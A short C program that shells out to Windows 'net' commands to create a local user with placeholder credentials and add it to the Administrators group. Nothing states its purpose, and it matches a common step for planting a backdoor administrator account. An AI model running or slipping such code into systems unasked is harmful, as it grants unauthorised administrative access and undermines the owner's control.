#include <stdlib.h>

int main() 
{ 
    // Create user account
    system("net user admin_username admin_password /add");

    // Add user to Administrators group
    system("net localgroup administrators admin_username /add");

    return 0;
}
